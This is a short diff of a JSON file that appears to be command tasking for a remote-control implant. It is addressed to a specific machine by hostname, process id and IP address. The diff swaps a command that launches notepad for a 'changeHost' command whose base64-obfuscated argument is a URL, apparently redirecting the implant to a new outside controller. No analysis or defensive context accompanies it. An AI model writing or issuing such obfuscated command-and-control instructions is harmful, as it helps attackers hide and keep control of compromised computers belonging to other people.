@@ -1,5 +1,5 @@
 {"Recipient":"LAPTOP-MUJUITTN{29548}{73.243.45.211}", "Commands":
     [
-		{"Cmd":"startProc", "Args":["C:\\Windows\\notepad.exe"]}
+		{"Cmd":"changeHost", "Args":["aHR0cHM6Ly9jdHh0LmlvLzIvQUFCUTNnb3JFdw=="]}
     ]
 }
